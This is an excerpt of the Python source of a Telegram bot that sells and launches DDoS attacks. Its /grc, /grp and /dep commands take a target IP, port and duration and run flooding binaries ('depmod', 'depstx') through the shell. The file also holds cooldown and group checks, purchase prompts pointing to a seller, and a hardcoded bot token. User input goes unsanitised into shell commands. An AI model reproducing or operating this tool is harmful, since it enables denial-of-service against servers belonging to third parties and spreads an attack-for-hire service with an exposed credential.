...
bot = telebot.TeleBot('8002808404:AAG_WUBKuwsELiJKOREyd2MlTYixG7Cmy20')
...
# Allowed Groups
ALLOWED_GROUPS = {-1002572256694} #grp chat id

# Cooldown Dictionary
attack_cooldown = {}

# Cooldown Time (in seconds)
COOLDOWN_TIME = 1  # 80 sec
...
def restart_bot(message):
    if message.from_user.id in ADMINS:
        ...
        time.sleep(2)
        subprocess.run("python3 depmod.py", shell=True)
...
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"You mean /depmod ?"
    bot.reply_to(message, response)
    
@bot.message_handler(commands=['depmod'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"😍 Welcome VVIP User ! ! !\n\nMy Owner was @DEOPOZITO1907\n\nPlease Read Information Down Bellow for Run the Bot\n\n➡️ To Start Attack :\n /dep - 200+ threads (private)\n\n➡️ To Start Attack : \n /grc - 200+ threads(group)\n\n➡️ To Run This Command : /settings\n\n➡️ Support me : @DEPOZITO1907\n\nWANT TO BUY CHAT ME : @DEPOZITO1907\n\nDO WITH YOUR OWN RISK ! ! !"
    bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Hello, send admin your id \n🤖if you already purchased\n 🤖Here Your ID: {user_id}"
    bot.reply_to(message, response)
...
# Handler for /bgmi command Group
...
def handle_attack(message):
    ...
    if chat_id not in ALLOWED_GROUPS:
        bot.reply_to(message, "❌ ONLY GROUP, CHAT : @DEPOZITO1907.")
        return
    ...
    if user_id in attack_cooldown and current_time - attack_cooldown[user_id] < COOLDOWN_TIME:
        ...
        bot.reply_to(message, f"⏳ Patience Cooldown Bro! ! !")
        return

    # Parse command arguments
    command_parts = message.text.split()
    if len(command_parts) != 5:
        bot.reply_to(message, "⚠️ Usage: /grc <ip> <port> <duration> <thread>\n✅ Usage of thread : \n - 200 = ultra-delay")
        return
    ...
    try:
        ...
        if duration > 269:
            bot.reply_to(message, "❌ Error: To much, 269 sec. max.")
            return
        ...
        attack_command = f"./depmod {target} {port} {duration} {thread}"
        bot.reply_to(message, f"🔥 DepMod sending DDOS to {target}:{port} in {duration} sec, with 200 bots. \n \n✅ Usage of thread : \n - 200 = ultra-delay")
        subprocess.run(attack_command, shell=True)
        bot.reply_to(message, f"🔥 Is It Done ?")

    except ValueError:
        bot.reply_to(message, "❌ Error: Wrong Port or Duration.")
...
def handle_attack(message):
    ...
    if len(command_parts) != 4:
        bot.reply_to(message, "⚠️ Usage: /grp <duration> <ip> <port>")
        return

    duration, target, port = command_parts[1], command_parts[2], command_parts[3]
    ...
    try:
        ...
        if duration > 360:
            bot.reply_to(message, "❌ Error: To much, 360 sec. max.")
            return
        ...
        # Execute attack (Replace with actual command)
        attack_command = f"./depstx 200 {duration} {target} {port}"
        bot.reply_to(message, f"🔥 Bot sending DDOS to {target}:{port} in {duration} sec, with 200 bots")
        subprocess.run(attack_command, shell=True)
        bot.reply_to(message, f"🔥 Is It Done ?")
    ...
    if user_id in user_state:
        ...
        try:
            ...
            if state['time'] > 600:
                ...
                record_command_logs(user_id, '/dep', state['target'], state['port'], state['time'])
                ...
                full_command = f"./depmod {state['target']} {state['port']} {state['time']} 200"
                subprocess.run(full_command, shell=True)
                bot.reply_to(call.message, f"DepMod Attack Finished. Target: {state['target']} Port: {state['port']} Duration: {state['time']} seconds")
...
def handle_bgmi_steps(message):
    ...
    if state['step'] == 1:
        ...
        try:
            ...
            markup.row_width = 2
            markup.add(
                InlineKeyboardButton("269 sec", callback_data="269"),
...
➡️ TO START ATTACK(private) : /dep 

➡️ TO START ATTACK(group) : /grc /grp
...
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, WANT TO BUY ? CHAT ME : @DEPOZITO1907
'''
    bot.reply_to(message, response)
...
➡️ /permit : Binary Usage Permission
...
def send_start_command():
    while True:
        try:
            bot.send_message(admin_id[0], '✅ DDOS READY MY LORD\n\nHOW ARE YOU?')
            time.sleep(3600)
        except Exception as e:
...
def run():
    app.run(host='0.0.0.0', port=29776)
